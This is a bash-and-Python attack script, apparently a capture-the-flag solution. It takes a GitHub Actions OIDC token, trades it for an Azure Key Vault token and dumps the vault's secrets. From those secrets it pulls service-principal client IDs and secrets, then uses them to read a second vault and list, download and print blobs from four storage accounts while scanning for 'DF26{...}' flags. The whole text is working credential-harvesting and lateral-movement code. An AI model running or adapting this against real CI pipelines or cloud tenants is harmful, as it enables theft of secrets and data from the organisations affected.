#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
def req(u,t,hdr=None):
    h={"Authorization":"Bearer "+t}
    if hdr:h.update(hdr)
    try:return urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=25).read().decode()
    except Exception as e:
        try:return e.read().decode()[:160]
        except:return str(e)
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps=[]
for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(req(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except:pass
XV="2021-08-06"
ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]
SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
for name,cid,sec in sps:
    print("===",name)
    vt=tok(cid,sec,"https://vault.azure.net/.default")
    if vt:
        r=req(SEC+"/secrets?api-version=7.4",vt)
        if '"value"' in r:
            try:
                for s in json.loads(r)["value"]:
                    val=req(s["id"]+"?api-version=7.4",vt);nm=s["id"].rsplit("/",1)[-1]
                    v=json.loads(val).get("value","");print("  SEC",nm,"=", " ".join(v));hit("sec:"+nm,val)
            except Exception as e:print("  sec parse",e,r[:120])
        else:print("  sec vault:",r[:100])
    st=tok(cid,sec,"https://storage.azure.com/.default")
    if st:
        for a in ACCTS:
            b=f"https://{a}.blob.core.windows.net"
            conts=re.findall(r'<Name>([^<]+)</Name>',req(b+"/?comp=list",st,{"x-ms-version":XV}))
            if conts:print("  stor",a,conts)
            for c in conts:
                for blob in re.findall(r'<Name>([^<]+)</Name>',req(b+f"/{c}?restype=container&comp=list",st,{"x-ms-version":XV})):
                    data=req(b+f"/{c}/{urllib.parse.quote(blob)}",st,{"x-ms-version":XV})
                    hit(f"{a}/{c}/{blob}",data)
                    if len(data)<400:print(f"    {a}/{c}/{blob}:",data[:300])
print("== done ==")
PY
